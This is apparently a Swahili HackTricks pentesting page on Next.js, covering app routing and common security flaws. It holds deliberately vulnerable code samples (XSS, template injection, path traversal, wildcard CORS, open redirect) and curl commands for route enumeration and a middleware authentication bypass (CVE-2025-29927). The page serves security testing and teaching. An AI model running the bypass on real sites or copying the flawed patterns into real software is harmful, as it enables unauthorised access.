# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Muundo wa Jumla wa Programu ya Next.js

### Muundo wa Faili wa Kawaida

Mradi wa kawaida wa Next.js unafuata muundo maalum wa faili na saraka unaounga mkono vipengele kama routing, API endpoints, na usimamizi wa assets za static. Hapa ni mpangilio wa kawaida:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Saraka na Faili Muhimu

- **public/:** Inahifadhi rasilimali za statiki kama picha, fonti, na faili nyingine. Faili hapa zinapatikana kwenye root path (`/`).
- **app/:** Saraka kuu kwa kurasa za application yako, layouts, components, na API routes. Inafuata mbinu ya **App Router**, ikiruhusu sifa za juu za routing na kutenganisha vipengele vya server na client.
- **app/layout.tsx:** Inaelezea root layout kwa application yako, ikizunguka kurasa zote na kutoa vipengele vya UI vinavyolingana kama header, footer, na navigation bar.
- **app/page.tsx:** Inatumika kama kiingilio cha root route `/`, ikionyesha ukurasa wa nyumbani.
- **app/[route]/page.tsx:** Inashughulikia static na dynamic routes. Kila folda ndani ya `app/` inawakilisha sehemu ya route, na `page.tsx` ndani ya hizo folda inaendana na component ya route.
- **app/api/:** Inajumuisha API routes, ikikuruhusu kutengeneza serverless functions zinazoshughulikia HTTP requests. Routes hizi zinachukua nafasi ya saraka ya jadi `pages/api`.
- **app/components/:** Inahifadhi React components zinazoweza kutumika tena katika kurasa na layouts mbalimbali.
- **app/styles/:** Inajumuisha global CSS files na CSS Modules kwa ajili ya styling inayolenga component.
- **app/utils/:** Inajumuisha utility functions, helper modules, na mantiki nyingine zisizo za UI zinazoweza kushirikiwa katika application.
- **.env.local:** Huhifadhi environment variables maalum kwa mazingira ya maendeleo ya ndani. Variables hizi **hazihifadhiwi** kwenye version control.
- **next.config.js:** Inabinafsisha tabia ya Next.js, ikiwa ni pamoja na webpack configurations, environment variables, na mipangilio ya usalama.
- **tsconfig.json:** Inasanidi mipangilio ya TypeScript kwa mradi, ikiruhusu type checking na sifa nyingine za TypeScript.
- **package.json:** Inasimamia project dependencies, scripts, na metadata.
- **README.md:** Inatoa documentation na taarifa kuhusu mradi, ikijumuisha maelekezo ya setup, mwongozo wa matumizi, na maelezo mengine muhimu.
- **yarn.lock / package-lock.json:** Hufunga dependencies za mradi kwa toleo maalum, kuhakikisha usakinishaji thabiti katika mazingira mbalimbali.

## Client-Side katika Next.js

### Routing Inayotegemea Faili katika saraka ya `app`

Saraka ya `app` ni nguzo ya routing katika matoleo ya hivi karibuni ya Next.js. Inatumia filesystem kufafanua routes, kufanya usimamizi wa routes kuwa wa kueleweka na wa kupanuka.

<details>

<summary>Kushughulikia Njia ya Mizizi /</summary>

**Muundo wa Faili:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Mafaili Muhimu:**

- **`app/page.tsx`**: Hushughulikia maombi kwa njia ya mzizi `/`.
- **`app/layout.tsx`**: Inaelezea muundo wa programu, ikizunguka kurasa zote.

**Utekelezaji:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Ufafanuzi:**

- **Ufafanuzi wa Route:** Faili `page.tsx` iliyoko moja kwa moja chini ya saraka `app` inalingana na route `/`.
- **Uonyesho:** Komponenti hii inaonyesha maudhui ya ukurasa wa nyumbani.
- **Ujumuishaji wa Layout:** Komponenti `HomePage` imefungwa na `layout.tsx`, ambayo inaweza kujumuisha vichwa, miguu ya ukurasa, na vipengele vingine vya kawaida.

</details>

<details>

<summary>Kushughulikia Njia Nyingine Zisizobadilika</summary>

**Mfano: `/about` Route**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Maelezo:**

- **Ufafanuzi wa Ruta:** Faili `page.tsx` ndani ya folda ya `about` inalingana na ruta `/about`.
- **Uonyeshaji:** Komponenti hii inaonyesha maudhui ya ukurasa wa about.

</details>

<details>

<summary>Ruta Dinamiki</summary>

Ruta dinamiki zinaruhusu kushughulikia paths zenye sehemu zinazobadilika, zikimuwezesha maombi kuonyesha maudhui kulingana na vigezo kama IDs, slugs, n.k.

**Mfano: Ruta `/posts/[id]`**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Ufafanuzi:**

- **Sehemu Dinamiki:** `[id]` inaashiria sehemu dinamiki katika route, ikikamata parameter ya `id` kutoka kwenye URL.
- **Kupata Vigezo:** kitu `params` kinajumuisha vigezo dinamiki, vinavyopatikana ndani ya component.
- **Kulinganisha Route:** Njia yoyote inayolingana na `/posts/*`, kama `/posts/1`, `/posts/abc`, n.k., itaendeshwa na component hii.

</details>

<details>

<summary>Routes Zilizomo Ndani</summary>

Next.js inasaidia nested routing, ikiruhusu miundo ya route iliyopangwa kwa ngazi inayofanana na muundo wa saraka.

**Mfano: `/dashboard/settings/profile` Route**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Maelezo:**

- **Kuingizwa kwa Kina:** Faili `page.tsx` ndani ya `dashboard/settings/profile/` inalingana na route `/dashboard/settings/profile`.
- **Uakisi wa Hierarkia:** Muundo wa saraka unaakisi njia ya URL, ukiboresha utunzaji na uwazi.

</details>

<details>

<summary>Routes za Kukamata Yote</summary>

Routes za kukamata yote zinashughulikia segmenti nyingi zilizo ndani au njia zisizojulikana, na kutoa unyumbufu katika usimamizi wa routes.

**Mfano: `/*` Route**

**Muundo wa Faili:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Maelezo:**

- **Catch-All Segment:** `[...slug]` huchukua sehemu zote za njia zilizobaki kama array.
- **Usage:** Inafaa kwa kushughulikia matukio ya dynamic routing kama njia zinazotengenezwa na watumiaji, makundi yaliyowekwa ndani, n.k.
- **Route Matching:** Njia kama `/anything/here`, `/foo/bar/baz`, n.k., zinashughulikiwa na component hii.

</details>

### Hatari za upande wa mteja zinazowezekana

Ingawa Next.js inatoa msingi salama, mbinu zisizo sahihi za kuandika code zinaweza kuanzisha udhaifu. Hatari kuu za upande wa mteja ni pamoja na:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS attacks hutokea wakati scripts hatari zinachanganywa kwenye tovuti za kuaminika. Wadukuzi wanaweza kutekeleza scripts katika browsers za watumiaji, kuiba data au kufanya vitendo kwa niaba ya mtumiaji.

**Mfano wa Code Hatari:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Kwa Nini Ni Dhaifu:** Kutumia `dangerouslySetInnerHTML` na input isiyothibitishwa kunaruhusu wadukuzi kuingiza scripts zenye madhara.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Hutokea wakati pembejeo za mtumiaji zinaposhughulikiwa vibaya katika templates, zikiyoruhusu wadukuzi kuingiza na kutekeleza templates au expressions.

**Mfano wa Code Iliyo Dhaifu:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Kwa Nini Ni Hatari:** Ikiwa `template` au `data` vinajumuisha maudhui mabaya, vinaweza kusababisha utekelezaji wa msimbo usiokusudiwa.

</details>

<details>

<summary>Client Path Traversal</summary>

Ni udhaifu unaowawezesha washambulizi kuchezea path za upande wa mteja kufanya vitendo visivyo kusudiwa, kama vile Cross-Site Request Forgery (CSRF). Tofauti na server-side path traversal, inayolenga filesystem ya server, CSPT inalenga kutumia mbinu za upande wa mteja ili kuhamisha maombi halali ya API kwa endpoints hatarishi.

**Mfano wa Msimbo Dhaifu:**

Programu ya Next.js inaruhusu watumiaji kupakia na kupakua faili. Kipengele cha kupakua kimeotekelezwa upande wa mteja, ambapo watumiaji wanaweza kutaja njia ya faili ya kupakua.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Senario ya Shambulio

1. **Attacker's Objective**: Fanya shambulio la CSRF ili kufuta faili muhimu (mfano, `admin/config.json`) kwa kuingilia `filePath`.
2. **Exploiting CSPT**:
- **Malicious Input**: Mshambuliaji anaunda URL yenye `filePath` iliyobadilishwa kama `../deleteFile/config.json`.
- **Resulting API Call**: Client-side code inafanya request kwa `/api/files/../deleteFile/config.json`.
- **Server's Handling**: Ikiwa server haiangalii `filePath`, inashughulikia ombi hilo, ikiwezekana kufuta au kufichua faili nyeti.
3. **Executing CSRF**:
- **Crafted Link**: Mshambuliaji amtumia mwanaathiriwa kiungo au aingize script ya uharibifu inayochochea ombi la download lenye `filePath` iliyobadilishwa.
- **Outcome**: Mwanaathiriwa bila kujua anatekeleza kitendo hicho, ikisababisha upatikanaji au kufutwa kwa faili bila idhini.

#### Kwa Nini Inavyokuwa Hatari

- **Lack of Input Validation**: client-side inaruhusu ingizo la `filePath` bila mipaka, ikiruhusu path traversal.
- **Trusting Client Inputs**: server-side API inamwamini na kushughulikia `filePath` bila kusafishwa.
- **Potential API Actions**: Ikiwa endpoint ya API inafanya vitendo vinavyobadilisha hali (mfano, kufuta, kuhariri faili), inaweza kutumiwa kupitia CSPT.

</details>

### Uchunguzi: ugunduzi wa static export route kupitia _buildManifest

When `nextExport`/`autoExport` are true (utoaji statiki), Next.js inaonyesha `buildId` katika HTML na inahudumia build manifest kwenye `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping huko hufafanua kila page iliyoprerender bila brute force.

- Chukua buildId kutoka kwenye root response (mara nyingi imechapishwa chini) au kutoka kwa `<script>` tags zinazopakia `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Tumia njia zilizogunduliwa (kwa mfano `/docs`, `/docs/content/examples`, `/signin`) kuendesha auth testing na endpoint discovery.

## Upande wa seva katika Next.js

### Uwasilishaji upande wa seva (Server-Side Rendering, SSR)

Kurasa zinatengenezwa kwenye seva kwa kila ombi, ikihakikisha mtumiaji anapata HTML iliyotengenezwa kikamilifu. Katika kesi hii unapaswa kuunda seva yako maalum ili kushughulikia maombi.

**Matumizi:**

- Maudhui yanayobadilika mara kwa mara.
- Uboreshaji wa SEO, kwani mashine za utafutaji zinaweza kukagua ukurasa uliotengenezwa kikamilifu.

**Utekelezaji:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Uundaji wa Tovuti Statiki (SSG)

Kurasa zinapre-render wakati wa build, na kusababisha muda wa upakiaji kuwa mfupi na kupunguza mzigo wa seva.

**Matumizi:**

- Yaliyomo ambayo hayabadiliki mara kwa mara.
- Blogi, nyaraka, kurasa za uuzaji.

**Utekelezaji:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Kazi zisizo na seva (API Routes)

Next.js inaruhusu kuunda API endpoints kama serverless functions. Functions hizi zinaendesha kwa ombi bila haja ya seva maalum.

**Matumizi:**

- Kushughulikia uwasilishaji wa fomu.
- Kuingiliana na hifadhidata.
- Kusindika data au kuunganisha na API za wahusika wa tatu.

**Utekelezaji:**

Kutokana na kuletwa kwa saraka ya `app` katika Next.js 13, routing na kushughulikia API vimekuwa vya kubadilika zaidi na zenye nguvu zaidi. Mbinu hii ya kisasa inaendana kwa karibu na mfumo wa routing unaotegemea faili lakini inaleta uwezo ulioboreshwa, ikijumuisha msaada kwa server na client components.

#### Mshughuliki wa Route Msingi

**Muundo wa Faili:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Maelezo:**

- **Mahali:** API routes ziko chini ya saraka `app/api/`.
- **Majina ya Faili:** Kila endpoint ya API iko kwenye folda yake yenye faili `route.js` au `route.ts`.
- **Funsi Zilizotolewa:** Badala ya default export moja, hutolewa funti za method za HTTP maalum (mfano, `GET`, `POST`).
- **Kushughulikia Majibu:** Tumia constructor ya `Response` kurudisha majibu, ikiruhusu udhibiti zaidi juu ya headers na status codes.

#### Jinsi ya kushughulikia njia na method nyingine:

<details>

<summary>Kushughulikia Methods Maalum za HTTP</summary>

Next.js 13+ inaruhusu kutaja handlers kwa method maalum za HTTP ndani ya faili moja ya `route.js` au `route.ts`, jambo linalochangia code kuwa safi na yenye muundo mzuri.

**Mfano:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Maelezo:**

- **Utoaji Mbalimbali:** Kila mbinu ya HTTP (`GET`, `PUT`, `DELETE`) ina kazi yake iliyotokezwa.
- **Vigezo:** Hoja ya pili inatoa ufikiaji kwa vigezo vya route kupitia `params`.
- **Majibu Yaliyoboreshwa:** Udhibiti mkubwa juu ya response objects, ukiruhusu usimamizi sahihi wa headers na status codes.

</details>

<details>

<summary>Catch-All na Nested Routes</summary>

Next.js 13+ inaunga mkono sifa za routing za juu kama catch-all routes na nested API routes, ikiruhusu muundo wa API wenye nguvu zaidi na unaoweza kupanuka.

**Mfano wa route ya Catch-All:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Ufafanuzi:**

- **Sintaksia:** `[...]` inaashiria sehemu ya 'catch-all', ikikamata njia zote zilizo ndani.
- **Matumizi:** Inafaa kwa APIs zinazohitaji kushughulikia kina tofauti za routes au segments zinazobadilika.

**Mfano wa Nested Routes:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Maelezo:**

- **Uwekaji wa kina:** Unaruhusu miundo ya API yenye ngazi nyingi (hierarchical), ikionyesha uhusiano wa rasilimali.
- **Kupata vigezo:** Inarahisisha kupata vigezo vingi vya route kupitia `params` object.

</details>

<details>

<summary>Kusimamia API routes katika Next.js 12 and Earlier</summary>

## API Routes katika the `pages` Directory (Next.js 12 and Earlier)

Kabla Next.js 13 ilipotambulisha `app` directory na kuboresha uwezo wa routing, API routes zilitengenezwa hasa ndani ya `pages` directory. Njia hii bado inatumiwa sana na inasaidiwa katika Next.js 12 na matoleo ya awali.

#### Basic API Route

**File Structure:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Maelezo:**

- **Mahali:** API routes ziko ndani ya saraka `pages/api/`.
- **Utoaji:** Tumia `export default` kuainisha handler function.
- **Saini ya Function:** Handler inapokea `req` (HTTP request) na `res` (HTTP response) objects.
- **Routing:** Jina la faili (`hello.js`) linahusishwa na endpoint `/api/hello`.

#### API Routes Dinamiki

**Muundo wa Faili:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Maelezo:**

- **Sehemu Dinamiki:** Mabano ya mraba (`[id].js`) yanaonyesha sehemu za route zinazobadilika.
- **Kupata Vigezo:** Tumia `req.query.id` kupata kigezo kinachobadilika.
- **Kushughulikia Methods:** Tumia mantiki ya masharti kushughulikia HTTP methods tofauti (`GET`, `PUT`, `DELETE`, n.k.).

#### Kushughulikia HTTP Methods Tofauti

Ingawa mfano wa msingi wa API route unashughulikia HTTP methods zote ndani ya function moja, unaweza kuunda muundo wa code yako kushughulikia kila method kwa uwazi na uratibu bora.

**Mfano:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Mbinu Bora:** 

- **Kutenganisha Majukumu:** Tenganisha mantiki wazi kwa ajili ya HTTP methods tofauti.
- **Ulinganifu wa Majibu:** Hakikisha miundo ya majibu ni thabiti ili kurahisisha kushughulikia upande wa mteja.
- **Ushughulikiaji wa Makosa:** Shughulikia kwa hila mbinu zisizoungwa mkono na makosa yasiyotarajiwa.

</details>

### Usanidi wa CORS

Dhibiti vyanzo vinavyoweza kufikia API routes zako, kupunguza hatari zinazohusiana na Cross-Origin Resource Sharing (CORS).

**Mfano wa Usanidi Mbaya:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Kumbuka kwamba **CORS pia inaweza kusanidiwa katika routes zote za API** ndani ya **`middleware.ts`** file:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Tatizo:**

- **`Access-Control-Allow-Origin: '*'`:** Inaruhusu tovuti yoyote kufikia API, na hivyo inaweza kuruhusu tovuti zenye nia mbaya kuingiliana na API yako bila vikwazo.
- **Kuruhusu Mbinu Zote:** Kuruhusu mbinu zote kunaweza kumwezesha mshambuliaji kufanya vitendo visivyotakwa.

**Jinsi washambuliaji wanavyovitumia:**

Washambuliaji wanaweza kutengeneza tovuti zenye madhumuni mabaya zinazofanya maombi kwa API yako, kwa hivyo wanaweza kutumia vibaya vipengele kama vile kupata data, kubadilisha data, au kusababisha vitendo visivyotakiwa kwa niaba ya watumiaji waliothibitishwa.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Server code exposure in Client Side

Ni rahisi **use code used by the server also in code exposed and used by the client side**, njia bora ya kuhakikisha kwamba faili ya code haifichuki kwenye client side ni kwa kutumia import hii mwanzoni mwa faili:
```js
import "server-only"
```
## Faili Muhimu na Majukumu Yao

### `middleware.ts` / `middleware.js`

**Mahali:** Mzizi wa mradi au ndani ya `src/`.

**Madhumuni:** Inatekeleza msimbo katika kazi ya server-side isiyo ya seva kabla ya ombi kushughulikiwa, ikiruhusu shughuli kama uthibitisho, kuelekeza tena, au kubadilisha majibu.

**Mtiririko wa Utekelezaji:**

1. **Ombi Linaloingia:** Middleware inakamata ombi.
2. **Usindikaji:** Hufanya operesheni kulingana na ombi (kwa mfano, kuangalia uthibitisho).
3. **Urekebishaji wa Jibu:** Inaweza kubadilisha jibu au kuhamisha udhibiti kwa handler inayofuata.

**Mifano ya Matumizi:**

- Kuelekeza watumiaji wasioidhinishwa.
- Kuongeza headers maalum.
- Kurekodi maombi.

**Mfano wa Mipangilio:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Ikiwa uthibitishaji unaotekelezwa katika middleware, toleo za Next.js zilizoathiriwa (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) zinaweza kuvukwa kwa kuingiza kichwa `x-middleware-subrequest`. Mfumo utaepuka recursion ya middleware na kurudisha ukurasa uliolindwa.

- Tabia ya msingi kawaida huwa redirect ya 307 kwa route ya login kama `/api/auth/signin`.
- Tuma thamani ndefu ya `x-middleware-subrequest` (rudia `middleware` ili kufikia `MAX_RECURSION_DEPTH`) ili kubadilisha majibu kuwa 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Kwa sababu kurasa zilizothibitishwa zinavuta subresources nyingi, ongeza header kwa kila ombi (mfano, Burp Match/Replace kwa match string tupu) ili kuzuia assets kuelekezwa upya.

### `next.config.js`

**Location:** Mzizi wa mradi.

**Purpose:** Inaseti tabia ya Next.js, kuwezesha au kuzima vipengele, kubinafsisha webpack configurations, kuweka environment variables, na kusanidi vipengele kadhaa vya usalama.

**Key Security Configurations:**

<details>

<summary>Security Headers</summary>

Security headers zinaongeza usalama wa application yako kwa kuelekeza browsers jinsi ya kushughulikia content. Zinasaidia kupunguza mashambulizi mbalimbali kama Cross-Site Scripting (XSS), Clickjacking, na MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Mifano:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Mipangilio ya Uboreshaji Picha</summary>

Next.js huboresha picha kwa utendaji, lakini mipangilio isiyo sahihi inaweza kusababisha udhaifu wa usalama, kama kuruhusu vyanzo visivyoaminika kuingiza maudhui mabaya.

**Mfano wa Mipangilio Mbaya:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Tatizo:**

- **`'*'`:** Huuruhusu picha ziziapakwe kutoka kwa chanzo chochote cha nje, ikiwa ni pamoja na vikoa visivyoaminifu au vyenye madhara. Wadukuzi wanaweza kuwa mwenyeji wa picha zenye payloads zenye madhara au yaliyomo yanayowadanganya watumiaji.
- Tatizo jingine linaweza kuwa kuruhusu kikoa **ambacho mtu yeyote anaweza kupakia picha** (kama `raw.githubusercontent.com`)

**Jinsi wadukuzi wanavyovitumia:**

Kwa kuingiza picha kutoka vyanzo vyenye madhara, wadukuzi wanaweza kufanya mashambulizi ya phishing, kuonyesha taarifa zinazoongoza kwa upotoshaji, au kutumia udhaifu katika maktaba za kuonyesha picha.

</details>

<details>

<summary>Ufichaji wa Vigezo vya Mazingira</summary>

Dhibiti taarifa nyeti kama API keys na database credentials kwa usalama bila kuzifunua kwa mteja.

#### a. Kufichua vigezo nyeti

**Mfano wa Mipangilio Mbaya:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Tatizo:**

- **`SECRET_API_KEY`:** Bila kiambishi cha `NEXT_PUBLIC_`, Next.js haifunuli variables kwa client. Hata hivyo, ikiwa imewekwa kwa bahati mbaya (kwa mfano, `NEXT_PUBLIC_SECRET_API_KEY`), inakuwa inapatikana upande wa client.

**Jinsi washambuliaji wanavyovitumia:**

Iwapo vigezo nyeti vimefichuliwa kwa client, washambuliaji wanaweza kuvipata kwa kuchunguza client-side code au network requests, na hivyo kupata ufikiaji usioidhinishwa kwa APIs, databases, au huduma nyingine.

</details>

<details>

<summary>Uelekezaji</summary>

Simamia URL redirections na rewrites ndani ya application yako, kuhakikisha kwamba users wanaelekezwa ipasavyo bila kuanzisha open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Mfano wa Usanidi Mbaya:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Tatizo:**

- **Dynamic Destination:** Inaruhusu watumiaji kubainisha URL yoyote, ikiruhusu open redirect attacks.
- **Trusting User Input:** Kuelekeza kwa URL zinazotolewa na watumiaji bila uthibitisho kunaweza kusababisha phishing, malware distribution, or credential theft.

**Jinsi wadukuzi wanavyovitumia:**

Wadukuzi wanaweza kutengeneza URL zinazoweza kuonekana zinatoka kwenye domain yako lakini kuielekeza tena watumiaji kwa tovuti zenye madhara. Kwa mfano:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Watumiaji wanaomuamini domain ya asili wanaweza bila kutambua kuelekezwa kwenye tovuti zenye hatari.

</details>

<details>

<summary>Webpack Configuration</summary>

Rekebisha mipangilio ya Webpack kwa programu yako ya Next.js, ambayo bila kukusudia inaweza kuleta mianya ya usalama ikiwa haitashughulikiwa kwa uangalifu.

#### a. Kufichua moduli nyeti

